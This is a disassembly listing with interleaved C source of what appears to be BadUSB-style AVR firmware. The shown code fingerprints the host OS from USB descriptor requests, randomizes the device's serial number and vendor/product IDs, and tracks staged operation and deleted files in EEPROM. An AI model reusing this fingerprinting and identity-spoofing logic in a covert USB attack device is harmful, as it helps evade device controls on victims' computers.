    const uint8_t  DescriptorType   = (wValue >> 8);
    const uint8_t  DescriptorNumber = (wValue & 0xFF);

    const void* Address = NULL;
    uint16_t    Size    = NO_DESCRIPTOR;
     558:	80 e0       	ldi	r24, 0x00	; 0
     55a:	90 e0       	ldi	r25, 0x00	; 0
                                    const void** const DescriptorAddress)
{
    const uint8_t  DescriptorType   = (wValue >> 8);
    const uint8_t  DescriptorNumber = (wValue & 0xFF);

    const void* Address = NULL;
     55c:	20 e0       	ldi	r18, 0x00	; 0
     55e:	30 e0       	ldi	r19, 0x00	; 0
     560:	6e c0       	rjmp	.+220    	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
    uint16_t    Size    = NO_DESCRIPTOR;

    switch (DescriptorType)
    {
        case DTYPE_Device:
            if (NULL != USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID)
     562:	e0 91 02 01 	lds	r30, 0x0102	; 0x800102 <USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID>
     566:	f0 91 03 01 	lds	r31, 0x0103	; 0x800103 <USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID+0x1>
     56a:	30 97       	sbiw	r30, 0x00	; 0
     56c:	09 f4       	brne	.+2      	; 0x570 <CALLBACK_USB_GetDescriptor+0x4a>
     56e:	54 c0       	rjmp	.+168    	; 0x618 <CALLBACK_USB_GetDescriptor+0xf2>
            {
                USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID((uint16_t*)&DeviceDescriptor.VendorID,
     570:	61 ee       	ldi	r22, 0xE1	; 225
     572:	72 e0       	ldi	r23, 0x02	; 2
     574:	8f ed       	ldi	r24, 0xDF	; 223
     576:	92 e0       	ldi	r25, 0x02	; 2
     578:	09 95       	icall
                                                        (uint16_t*)&DeviceDescriptor.ProductID);
            }
            Address = &DeviceDescriptor;
            Size    = sizeof(USB_Descriptor_Device_t);
     57a:	82 e1       	ldi	r24, 0x12	; 18
     57c:	90 e0       	ldi	r25, 0x00	; 0
            if (NULL != USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID)
            {
                USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID((uint16_t*)&DeviceDescriptor.VendorID,
                                                        (uint16_t*)&DeviceDescriptor.ProductID);
            }
            Address = &DeviceDescriptor;
     57e:	27 ed       	ldi	r18, 0xD7	; 215
     580:	32 e0       	ldi	r19, 0x02	; 2
     582:	5d c0       	rjmp	.+186    	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
        case DTYPE_Configuration:
            Address = &ConfigurationDescriptor;
            Size    = sizeof(USB_Descriptor_Configuration_t);
            break;
        case DTYPE_String:
            if (USB_ControlRequest.wLength == 0xFF)
     584:	20 91 fa 0d 	lds	r18, 0x0DFA	; 0x800dfa <USB_ControlRequest+0x6>
     588:	30 91 fb 0d 	lds	r19, 0x0DFB	; 0x800dfb <USB_ControlRequest+0x7>
     58c:	2f 3f       	cpi	r18, 0xFF	; 255
     58e:	31 05       	cpc	r19, r1
     590:	39 f4       	brne	.+14     	; 0x5a0 <CALLBACK_USB_GetDescriptor+0x7a>
            {
                guess_os.maybe_linux = 1;
     592:	20 91 81 09 	lds	r18, 0x0981	; 0x800981 <guess_os>
                guess_os.maybe_win = 1;
                guess_os.not_mac =
     596:	23 60       	ori	r18, 0x03	; 3
     598:	20 62       	ori	r18, 0x20	; 32
     59a:	20 93 81 09 	sts	0x0981, r18	; 0x800981 <guess_os>
     59e:	05 c0       	rjmp	.+10     	; 0x5aa <CALLBACK_USB_GetDescriptor+0x84>
                    1; // In testing, MacOS NEVER sets a descript request lenght of 255
            }
            else
            {
                guess_os.not_linux =
     5a0:	20 91 81 09 	lds	r18, 0x0981	; 0x800981 <guess_os>
     5a4:	28 60       	ori	r18, 0x08	; 8
     5a6:	20 93 81 09 	sts	0x0981, r18	; 0x800981 <guess_os>
                    1; // In testing, Linux ALWAYS sets a descriptor request length of 255;
            }

            switch (DescriptorNumber)
     5aa:	99 27       	eor	r25, r25
     5ac:	81 30       	cpi	r24, 0x01	; 1
     5ae:	91 05       	cpc	r25, r1
     5b0:	41 f0       	breq	.+16     	; 0x5c2 <CALLBACK_USB_GetDescriptor+0x9c>
     5b2:	b8 f1       	brcs	.+110    	; 0x622 <CALLBACK_USB_GetDescriptor+0xfc>
     5b4:	02 97       	sbiw	r24, 0x02	; 2
     5b6:	99 f0       	breq	.+38     	; 0x5de <CALLBACK_USB_GetDescriptor+0xb8>
{
    const uint8_t  DescriptorType   = (wValue >> 8);
    const uint8_t  DescriptorNumber = (wValue & 0xFF);

    const void* Address = NULL;
    uint16_t    Size    = NO_DESCRIPTOR;
     5b8:	80 e0       	ldi	r24, 0x00	; 0
     5ba:	90 e0       	ldi	r25, 0x00	; 0
                                    const void** const DescriptorAddress)
{
    const uint8_t  DescriptorType   = (wValue >> 8);
    const uint8_t  DescriptorNumber = (wValue & 0xFF);

    const void* Address = NULL;
     5bc:	20 e0       	ldi	r18, 0x00	; 0
     5be:	30 e0       	ldi	r19, 0x00	; 0
     5c0:	3e c0       	rjmp	.+124    	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
                case STRING_ID_Language:
                    Address = &LanguageString;
                    Size    = LanguageString.Header.Size;
                    break;
                case STRING_ID_Manufacturer:
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
     5c2:	e0 91 04 01 	lds	r30, 0x0104	; 0x800104 <USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC>
     5c6:	f0 91 05 01 	lds	r31, 0x0105	; 0x800105 <USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC+0x1>
     5ca:	30 97       	sbiw	r30, 0x00	; 0
     5cc:	79 f1       	breq	.+94     	; 0x62c <CALLBACK_USB_GetDescriptor+0x106>
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)
     5ce:	88 e8       	ldi	r24, 0x88	; 136
     5d0:	92 e0       	ldi	r25, 0x02	; 2
     5d2:	09 95       	icall
                                                               ManufacturerString.UnicodeString);
                    }
                    Address = &ManufacturerString;
                    Size    = ManufacturerString.Header.Size;
     5d4:	82 e1       	ldi	r24, 0x12	; 18
     5d6:	90 e0       	ldi	r25, 0x00	; 0
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)
                                                               ManufacturerString.UnicodeString);
                    }
                    Address = &ManufacturerString;
     5d8:	26 e8       	ldi	r18, 0x86	; 134
     5da:	32 e0       	ldi	r19, 0x02	; 2
     5dc:	30 c0       	rjmp	.+96     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
                    Size    = ManufacturerString.Header.Size;
                    break;
                case STRING_ID_Product:
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
     5de:	e0 91 04 01 	lds	r30, 0x0104	; 0x800104 <USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC>
     5e2:	f0 91 05 01 	lds	r31, 0x0105	; 0x800105 <USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC+0x1>
     5e6:	30 97       	sbiw	r30, 0x00	; 0
     5e8:	31 f1       	breq	.+76     	; 0x636 <CALLBACK_USB_GetDescriptor+0x110>
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)ProductString.UnicodeString);
     5ea:	80 e5       	ldi	r24, 0x50	; 80
     5ec:	92 e0       	ldi	r25, 0x02	; 2
     5ee:	09 95       	icall
                    }
                    Address = &ProductString;
                    Size    = ProductString.Header.Size;
     5f0:	86 e3       	ldi	r24, 0x36	; 54
     5f2:	90 e0       	ldi	r25, 0x00	; 0
                case STRING_ID_Product:
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)ProductString.UnicodeString);
                    }
                    Address = &ProductString;
     5f4:	2e e4       	ldi	r18, 0x4E	; 78
     5f6:	32 e0       	ldi	r19, 0x02	; 2
     5f8:	22 c0       	rjmp	.+68     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
            }

            break;
        case HID_DTYPE_HID:
            Address = &ConfigurationDescriptor.HID_KeyboardHID;
            Size    = sizeof(USB_HID_Descriptor_HID_t);
     5fa:	89 e0       	ldi	r24, 0x09	; 9
     5fc:	90 e0       	ldi	r25, 0x00	; 0
                    break;
            }

            break;
        case HID_DTYPE_HID:
            Address = &ConfigurationDescriptor.HID_KeyboardHID;
     5fe:	27 ec       	ldi	r18, 0xC7	; 199
     600:	32 e0       	ldi	r19, 0x02	; 2
            Size    = sizeof(USB_HID_Descriptor_HID_t);
            break;
     602:	1d c0       	rjmp	.+58     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
        case HID_DTYPE_Report:
            Address = &KeyboardReport;
            Size    = sizeof(KeyboardReport);
     604:	80 e4       	ldi	r24, 0x40	; 64
     606:	90 e0       	ldi	r25, 0x00	; 0
        case HID_DTYPE_HID:
            Address = &ConfigurationDescriptor.HID_KeyboardHID;
            Size    = sizeof(USB_HID_Descriptor_HID_t);
            break;
        case HID_DTYPE_Report:
            Address = &KeyboardReport;
     608:	29 ee       	ldi	r18, 0xE9	; 233
     60a:	32 e0       	ldi	r19, 0x02	; 2
            Size    = sizeof(KeyboardReport);
            break;
     60c:	18 c0       	rjmp	.+48     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
            Address = &DeviceDescriptor;
            Size    = sizeof(USB_Descriptor_Device_t);
            break;
        case DTYPE_Configuration:
            Address = &ConfigurationDescriptor;
            Size    = sizeof(USB_Descriptor_Configuration_t);
     60e:	89 e3       	ldi	r24, 0x39	; 57
     610:	90 e0       	ldi	r25, 0x00	; 0
            }
            Address = &DeviceDescriptor;
            Size    = sizeof(USB_Descriptor_Device_t);
            break;
        case DTYPE_Configuration:
            Address = &ConfigurationDescriptor;
     612:	2e e9       	ldi	r18, 0x9E	; 158
     614:	32 e0       	ldi	r19, 0x02	; 2
     616:	13 c0       	rjmp	.+38     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
            {
                USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID((uint16_t*)&DeviceDescriptor.VendorID,
                                                        (uint16_t*)&DeviceDescriptor.ProductID);
            }
            Address = &DeviceDescriptor;
            Size    = sizeof(USB_Descriptor_Device_t);
     618:	82 e1       	ldi	r24, 0x12	; 18
     61a:	90 e0       	ldi	r25, 0x00	; 0
            if (NULL != USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID)
            {
                USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID((uint16_t*)&DeviceDescriptor.VendorID,
                                                        (uint16_t*)&DeviceDescriptor.ProductID);
            }
            Address = &DeviceDescriptor;
     61c:	27 ed       	ldi	r18, 0xD7	; 215
     61e:	32 e0       	ldi	r19, 0x02	; 2
     620:	0e c0       	rjmp	.+28     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>

            switch (DescriptorNumber)
            {
                case STRING_ID_Language:
                    Address = &LanguageString;
                    Size    = LanguageString.Header.Size;
     622:	84 e0       	ldi	r24, 0x04	; 4
     624:	90 e0       	ldi	r25, 0x00	; 0
            }

            switch (DescriptorNumber)
            {
                case STRING_ID_Language:
                    Address = &LanguageString;
     626:	2a e9       	ldi	r18, 0x9A	; 154
     628:	32 e0       	ldi	r19, 0x02	; 2
     62a:	09 c0       	rjmp	.+18     	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)
                                                               ManufacturerString.UnicodeString);
                    }
                    Address = &ManufacturerString;
                    Size    = ManufacturerString.Header.Size;
     62c:	82 e1       	ldi	r24, 0x12	; 18
     62e:	90 e0       	ldi	r25, 0x00	; 0
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)
                                                               ManufacturerString.UnicodeString);
                    }
                    Address = &ManufacturerString;
     630:	26 e8       	ldi	r18, 0x86	; 134
     632:	32 e0       	ldi	r19, 0x02	; 2
     634:	04 c0       	rjmp	.+8      	; 0x63e <CALLBACK_USB_GetDescriptor+0x118>
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)ProductString.UnicodeString);
                    }
                    Address = &ProductString;
                    Size    = ProductString.Header.Size;
     636:	86 e3       	ldi	r24, 0x36	; 54
     638:	90 e0       	ldi	r25, 0x00	; 0
                case STRING_ID_Product:
                    if (NULL != USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)
                    {
                        USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC((wchar_t*)ProductString.UnicodeString);
                    }
                    Address = &ProductString;
     63a:	2e e4       	ldi	r18, 0x4E	; 78
     63c:	32 e0       	ldi	r19, 0x02	; 2
            Address = &KeyboardReport;
            Size    = sizeof(KeyboardReport);
            break;
    }

    *DescriptorAddress = Address;
     63e:	39 83       	std	Y+1, r19	; 0x01
     640:	28 83       	st	Y, r18
    return Size;
}
     642:	df 91       	pop	r29
     644:	cf 91       	pop	r28
     646:	08 95       	ret

00000648 <guess_host_os>:



guess_os_t guess_host_os(void)
{
    if (guess_os.not_mac && guess_os.not_linux && guess_os.maybe_win)
     648:	80 91 81 09 	lds	r24, 0x0981	; 0x800981 <guess_os>
     64c:	98 2f       	mov	r25, r24
     64e:	9a 72       	andi	r25, 0x2A	; 42
     650:	9a 32       	cpi	r25, 0x2A	; 42
     652:	41 f0       	breq	.+16     	; 0x664 <guess_host_os+0x1c>
    {
        return GO_WINDOWS;
    }
    else if (guess_os.maybe_linux && !guess_os.not_linux)
     654:	98 2f       	mov	r25, r24
     656:	99 70       	andi	r25, 0x09	; 9
     658:	91 30       	cpi	r25, 0x01	; 1
     65a:	31 f0       	breq	.+12     	; 0x668 <guess_host_os+0x20>
    {
        return GO_LINUX;
    }
    else if (!guess_os.not_mac)
     65c:	85 fd       	sbrc	r24, 5
     65e:	06 c0       	rjmp	.+12     	; 0x66c <guess_host_os+0x24>
    {
        return GO_MAC;
     660:	82 e0       	ldi	r24, 0x02	; 2
     662:	08 95       	ret

guess_os_t guess_host_os(void)
{
    if (guess_os.not_mac && guess_os.not_linux && guess_os.maybe_win)
    {
        return GO_WINDOWS;
     664:	80 e0       	ldi	r24, 0x00	; 0
     666:	08 95       	ret
    }
    else if (guess_os.maybe_linux && !guess_os.not_linux)
    {
        return GO_LINUX;
     668:	81 e0       	ldi	r24, 0x01	; 1
     66a:	08 95       	ret
    else if (!guess_os.not_mac)
    {
        return GO_MAC;
    }

    return GO_WINDOWS;
     66c:	80 e0       	ldi	r24, 0x00	; 0
}
     66e:	08 95       	ret

00000670 <guess_host_os_string>:

const char* guess_host_os_string(void)
{
    switch (guess_host_os())
     670:	eb df       	rcall	.-42     	; 0x648 <guess_host_os>
     672:	81 30       	cpi	r24, 0x01	; 1
     674:	41 f0       	breq	.+16     	; 0x686 <guess_host_os_string+0x16>
     676:	82 30       	cpi	r24, 0x02	; 2
     678:	19 f0       	breq	.+6      	; 0x680 <guess_host_os_string+0x10>
    {
        case GO_WINDOWS:
            return "OS_WINDOWS";
     67a:	83 e3       	ldi	r24, 0x33	; 51
     67c:	92 e0       	ldi	r25, 0x02	; 2
     67e:	08 95       	ret
        case GO_LINUX:
            return "OS_LINUX";
            break;

        case GO_MAC:
            return "OS_MAC";
     680:	87 e4       	ldi	r24, 0x47	; 71
     682:	92 e0       	ldi	r25, 0x02	; 2
     684:	08 95       	ret
        case GO_WINDOWS:
            return "OS_WINDOWS";
            break;

        case GO_LINUX:
            return "OS_LINUX";
     686:	8e e3       	ldi	r24, 0x3E	; 62
     688:	92 e0       	ldi	r25, 0x02	; 2

        default:
            return "OS_WINDOWS";
            break;
    }
}
     68a:	08 95       	ret

0000068c <print_eepr>:
    save_eepr();
}

void print_eepr(void)
{
    printf_P(PSTR("eppr_vars addr: 0x%08X\r\n"
     68c:	e2 e8       	ldi	r30, 0x82	; 130
     68e:	f9 e0       	ldi	r31, 0x09	; 9
     690:	25 81       	ldd	r18, Z+5	; 0x05
     692:	36 81       	ldd	r19, Z+6	; 0x06
     694:	83 81       	ldd	r24, Z+3	; 0x03
     696:	94 81       	ldd	r25, Z+4	; 0x04
                  "eppr_vars.curr_sector_stage2_deleted = %u\r\n"), 
                  EEPR_VARS_ADDR, 
                  sizeof(eppr_vars),
                  eppr_vars.restore_defaults_on_boot, 
                  eppr_vars.curr_stage,
                  eppr_vars.deleted_files,
     698:	62 81       	ldd	r22, Z+2	; 0x02
                  "eppr_vars.curr_sector_stage1_deleted = %u\r\n"
                  "eppr_vars.curr_sector_stage2_deleted = %u\r\n"), 
                  EEPR_VARS_ADDR, 
                  sizeof(eppr_vars),
                  eppr_vars.restore_defaults_on_boot, 
                  eppr_vars.curr_stage,
     69a:	51 81       	ldd	r21, Z+1	; 0x01
                  "eppr_vars.deleted_files = %d\r\n"
                  "eppr_vars.curr_sector_stage1_deleted = %u\r\n"
                  "eppr_vars.curr_sector_stage2_deleted = %u\r\n"), 
                  EEPR_VARS_ADDR, 
                  sizeof(eppr_vars),
                  eppr_vars.restore_defaults_on_boot, 
     69c:	40 81       	ld	r20, Z
    save_eepr();
}

void print_eepr(void)
{
    printf_P(PSTR("eppr_vars addr: 0x%08X\r\n"
     69e:	3f 93       	push	r19
     6a0:	2f 93       	push	r18
     6a2:	9f 93       	push	r25
     6a4:	8f 93       	push	r24
     6a6:	1f 92       	push	r1
     6a8:	6f 93       	push	r22
     6aa:	1f 92       	push	r1
     6ac:	5f 93       	push	r21
     6ae:	1f 92       	push	r1
     6b0:	4f 93       	push	r20
     6b2:	1f 92       	push	r1
     6b4:	87 e0       	ldi	r24, 0x07	; 7
     6b6:	8f 93       	push	r24
     6b8:	1f 92       	push	r1
     6ba:	1f 92       	push	r1
     6bc:	88 e9       	ldi	r24, 0x98	; 152
     6be:	90 e0       	ldi	r25, 0x00	; 0
     6c0:	9f 93       	push	r25
     6c2:	8f 93       	push	r24
     6c4:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
                  eppr_vars.restore_defaults_on_boot, 
                  eppr_vars.curr_stage,
                  eppr_vars.deleted_files,
                  eppr_vars.curr_sector_stage1_deleted,
                  eppr_vars.curr_sector_stage2_deleted);
}
     6c8:	8d b7       	in	r24, 0x3d	; 61
     6ca:	9e b7       	in	r25, 0x3e	; 62
     6cc:	40 96       	adiw	r24, 0x10	; 16
     6ce:	0f b6       	in	r0, 0x3f	; 63
     6d0:	f8 94       	cli
     6d2:	9e bf       	out	0x3e, r25	; 62
     6d4:	0f be       	out	0x3f, r0	; 63
     6d6:	8d bf       	out	0x3d, r24	; 61
     6d8:	08 95       	ret

000006da <save_eepr>:
    }
}

void save_eepr(void)
{
    if (eppr_vars.curr_stage == STAG_2)
     6da:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
     6de:	81 30       	cpi	r24, 0x01	; 1
     6e0:	11 f4       	brne	.+4      	; 0x6e6 <save_eepr+0xc>
    {
        eppr_vars.curr_stage = STAG_1; // RACE CONDITION, THE USER DISCONNECTED THE DEVICE BETWEEN STAGES....
     6e2:	10 92 83 09 	sts	0x0983, r1	; 0x800983 <eppr_vars+0x1>
    }
    eeprom_write_block((void*)&eppr_vars, (void*)EEPR_VARS_ADDR, sizeof(eppr_vars));
     6e6:	47 e0       	ldi	r20, 0x07	; 7
     6e8:	50 e0       	ldi	r21, 0x00	; 0
     6ea:	60 e0       	ldi	r22, 0x00	; 0
     6ec:	70 e0       	ldi	r23, 0x00	; 0
     6ee:	82 e8       	ldi	r24, 0x82	; 130
     6f0:	99 e0       	ldi	r25, 0x09	; 9
     6f2:	0c 94 aa 3c 	jmp	0x7954	; 0x7954 <eeprom_write_block>
     6f6:	08 95       	ret

000006f8 <defaults_eepr>:

volatile EPPR_VARS_t eppr_vars;

void defaults_eepr(void)
{
    memset((void*)&eppr_vars, 0, sizeof(eppr_vars));
     6f8:	87 e0       	ldi	r24, 0x07	; 7
     6fa:	e2 e8       	ldi	r30, 0x82	; 130
     6fc:	f9 e0       	ldi	r31, 0x09	; 9
     6fe:	df 01       	movw	r26, r30
     700:	1d 92       	st	X+, r1
     702:	8a 95       	dec	r24
     704:	e9 f7       	brne	.-6      	; 0x700 <defaults_eepr+0x8>
    
    save_eepr();
     706:	e9 cf       	rjmp	.-46     	; 0x6da <save_eepr>
     708:	08 95       	ret

0000070a <load_eepr>:
    eeprom_write_block((void*)&eppr_vars, (void*)EEPR_VARS_ADDR, sizeof(eppr_vars));
}

void load_eepr(void)
{
    eeprom_read_block((void*)&eppr_vars, (void*)EEPR_VARS_ADDR, sizeof(eppr_vars));
     70a:	47 e0       	ldi	r20, 0x07	; 7
     70c:	50 e0       	ldi	r21, 0x00	; 0
     70e:	60 e0       	ldi	r22, 0x00	; 0
     710:	70 e0       	ldi	r23, 0x00	; 0
     712:	82 e8       	ldi	r24, 0x82	; 130
     714:	99 e0       	ldi	r25, 0x09	; 9
     716:	0e 94 92 3c 	call	0x7924	; 0x7924 <eeprom_read_block>
    if (eppr_vars.curr_stage == STAG_2)
     71a:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
     71e:	81 30       	cpi	r24, 0x01	; 1
     720:	11 f4       	brne	.+4      	; 0x726 <load_eepr+0x1c>
    {
        eppr_vars.curr_stage = STAG_1; // RACE CONDITION, THE USER DISCONNECTED THE DEVICE BETWEEN STAGES....
     722:	10 92 83 09 	sts	0x0983, r1	; 0x800983 <eppr_vars+0x1>
     726:	08 95       	ret

00000728 <eepr_boot>:
                  eppr_vars.curr_sector_stage2_deleted);
}

void eepr_boot(void)
{
    load_eepr();
     728:	f0 df       	rcall	.-32     	; 0x70a <load_eepr>
    if (eppr_vars.restore_defaults_on_boot)
     72a:	80 91 82 09 	lds	r24, 0x0982	; 0x800982 <eppr_vars>
    {
        defaults_eepr();
     72e:	81 11       	cpse	r24, r1
     730:	e3 cf       	rjmp	.-58     	; 0x6f8 <defaults_eepr>
     732:	08 95       	ret

00000734 <myrand>:
    static uint8_t cur;
    //32 bit random number, from noinit sram
    static uint32_t random31 __attribute__((section(".noinit")));
    //temp storage for random number
    uint32_t temp;
    temp = random31 << 1;
     734:	80 91 02 0e 	lds	r24, 0x0E02	; 0x800e02 <__bss_end>
     738:	90 91 03 0e 	lds	r25, 0x0E03	; 0x800e03 <__bss_end+0x1>
     73c:	a0 91 04 0e 	lds	r26, 0x0E04	; 0x800e04 <__bss_end+0x2>
     740:	b0 91 05 0e 	lds	r27, 0x0E05	; 0x800e05 <__bss_end+0x3>
     744:	88 0f       	add	r24, r24
     746:	99 1f       	adc	r25, r25
     748:	aa 1f       	adc	r26, r26
     74a:	bb 1f       	adc	r27, r27
    //if bit31 set, or if init sram happens to be 0
    if ((temp & 0x80000000) || (temp == 0))
     74c:	18 16       	cp	r1, r24
     74e:	19 06       	cpc	r1, r25
     750:	1a 06       	cpc	r1, r26
     752:	1b 06       	cpc	r1, r27
     754:	44 f0       	brlt	.+16     	; 0x766 <myrand+0x32>
    {
        //xor magic number (taps)
        temp ^= 0x20AA95B5;
     756:	25 eb       	ldi	r18, 0xB5	; 181
     758:	82 27       	eor	r24, r18
     75a:	25 e9       	ldi	r18, 0x95	; 149
     75c:	92 27       	eor	r25, r18
     75e:	2a ea       	ldi	r18, 0xAA	; 170
     760:	a2 27       	eor	r26, r18
     762:	20 e2       	ldi	r18, 0x20	; 32
     764:	b2 27       	eor	r27, r18
    }
    //save back to random number for next time
    random31 = temp;
     766:	80 93 02 0e 	sts	0x0E02, r24	; 0x800e02 <__bss_end>
     76a:	90 93 03 0e 	sts	0x0E03, r25	; 0x800e03 <__bss_end+0x1>
     76e:	a0 93 04 0e 	sts	0x0E04, r26	; 0x800e04 <__bss_end+0x2>
     772:	b0 93 05 0e 	sts	0x0E05, r27	; 0x800e05 <__bss_end+0x3>
    //return lowest byte only
    return temp + cur++;
     776:	20 91 48 09 	lds	r18, 0x0948	; 0x800948 <cur.2570>
     77a:	31 e0       	ldi	r19, 0x01	; 1
     77c:	32 0f       	add	r19, r18
     77e:	30 93 48 09 	sts	0x0948, r19	; 0x800948 <cur.2570>
}
     782:	82 0f       	add	r24, r18
     784:	08 95       	ret

00000786 <lufa_hook_usb_serialnumber_randomize>:



void lufa_hook_usb_serialnumber_randomize(uint16_t* serial_str,
        size_t nr_elements)
{
     786:	ef 92       	push	r14
     788:	ff 92       	push	r15
     78a:	0f 93       	push	r16
     78c:	1f 93       	push	r17
     78e:	cf 93       	push	r28
     790:	df 93       	push	r29
     792:	8c 01       	movw	r16, r24
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
     794:	90 91 83 09 	lds	r25, 0x0983	; 0x800983 <eppr_vars+0x1>
     798:	93 30       	cpi	r25, 0x03	; 3
     79a:	c1 f1       	breq	.+112    	; 0x80c <lufa_hook_usb_serialnumber_randomize+0x86>
     79c:	eb 01       	movw	r28, r22
    {
        return;
    }
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
     79e:	80 91 47 09 	lds	r24, 0x0947	; 0x800947 <init.2577>
     7a2:	81 11       	cpse	r24, r1
     7a4:	1e c0       	rjmp	.+60     	; 0x7e2 <lufa_hook_usb_serialnumber_randomize+0x5c>
    {
        init = true;
     7a6:	81 e0       	ldi	r24, 0x01	; 1
     7a8:	80 93 47 09 	sts	0x0947, r24	; 0x800947 <init.2577>
        for (size_t i = 0; i < sizeof(charset); i++)
     7ac:	e1 2c       	mov	r14, r1
     7ae:	f1 2c       	mov	r15, r1
     7b0:	14 c0       	rjmp	.+40     	; 0x7da <lufa_hook_usb_serialnumber_randomize+0x54>
        {
            charset[i] = (myrand() % ('9' + 1 - '1')) + '1';
     7b2:	c0 df       	rcall	.-128    	; 0x734 <myrand>
     7b4:	f7 01       	movw	r30, r14
     7b6:	e9 5c       	subi	r30, 0xC9	; 201
     7b8:	f6 4f       	sbci	r31, 0xF6	; 246
     7ba:	99 e3       	ldi	r25, 0x39	; 57
     7bc:	89 9f       	mul	r24, r25
     7be:	91 2d       	mov	r25, r1
     7c0:	11 24       	eor	r1, r1
     7c2:	96 95       	lsr	r25
     7c4:	29 2f       	mov	r18, r25
     7c6:	22 0f       	add	r18, r18
     7c8:	22 0f       	add	r18, r18
     7ca:	22 0f       	add	r18, r18
     7cc:	92 0f       	add	r25, r18
     7ce:	89 1b       	sub	r24, r25
     7d0:	8f 5c       	subi	r24, 0xCF	; 207
     7d2:	80 83       	st	Z, r24
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
    {
        init = true;
        for (size_t i = 0; i < sizeof(charset); i++)
     7d4:	8f ef       	ldi	r24, 0xFF	; 255
     7d6:	e8 1a       	sub	r14, r24
     7d8:	f8 0a       	sbc	r15, r24
     7da:	80 e1       	ldi	r24, 0x10	; 16
     7dc:	e8 16       	cp	r14, r24
     7de:	f1 04       	cpc	r15, r1
     7e0:	40 f3       	brcs	.-48     	; 0x7b2 <lufa_hook_usb_serialnumber_randomize+0x2c>
     7e2:	80 e0       	ldi	r24, 0x00	; 0
     7e4:	90 e0       	ldi	r25, 0x00	; 0
     7e6:	0f c0       	rjmp	.+30     	; 0x806 <lufa_hook_usb_serialnumber_randomize+0x80>
        }

    }
    for (size_t i = 0; i < nr_elements; i++)
    {
        serial_str[i] = charset[i % sizeof(charset)];
     7e8:	fc 01       	movw	r30, r24
     7ea:	ee 0f       	add	r30, r30
     7ec:	ff 1f       	adc	r31, r31
     7ee:	e0 0f       	add	r30, r16
     7f0:	f1 1f       	adc	r31, r17
     7f2:	dc 01       	movw	r26, r24
     7f4:	af 70       	andi	r26, 0x0F	; 15
     7f6:	bb 27       	eor	r27, r27
     7f8:	a9 5c       	subi	r26, 0xC9	; 201
     7fa:	b6 4f       	sbci	r27, 0xF6	; 246
     7fc:	2c 91       	ld	r18, X
     7fe:	30 e0       	ldi	r19, 0x00	; 0
     800:	31 83       	std	Z+1, r19	; 0x01
     802:	20 83       	st	Z, r18
        {
            charset[i] = (myrand() % ('9' + 1 - '1')) + '1';
        }

    }
    for (size_t i = 0; i < nr_elements; i++)
     804:	01 96       	adiw	r24, 0x01	; 1
     806:	8c 17       	cp	r24, r28
     808:	9d 07       	cpc	r25, r29
     80a:	70 f3       	brcs	.-36     	; 0x7e8 <lufa_hook_usb_serialnumber_randomize+0x62>
    {
        serial_str[i] = charset[i % sizeof(charset)];
    }
}
     80c:	df 91       	pop	r29
     80e:	cf 91       	pop	r28
     810:	1f 91       	pop	r17
     812:	0f 91       	pop	r16
     814:	ff 90       	pop	r15
     816:	ef 90       	pop	r14
     818:	08 95       	ret

0000081a <scsi_hook_productvendor_id_randomize>:
void(*LUFA_DREG_HOOK_INTERNAL_SERIAL)(uint16_t* serial_str,
                                      size_t nr_elements) = lufa_hook_usb_serialnumber_randomize;

void scsi_hook_productvendor_id_randomize(uint8_t vendor_id[8],
        uint8_t product_id[16])
{
     81a:	ef 92       	push	r14
     81c:	ff 92       	push	r15
     81e:	0f 93       	push	r16
     820:	1f 93       	push	r17
     822:	cf 93       	push	r28
     824:	df 93       	push	r29
     826:	8c 01       	movw	r16, r24
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
     828:	90 91 83 09 	lds	r25, 0x0983	; 0x800983 <eppr_vars+0x1>
     82c:	93 30       	cpi	r25, 0x03	; 3
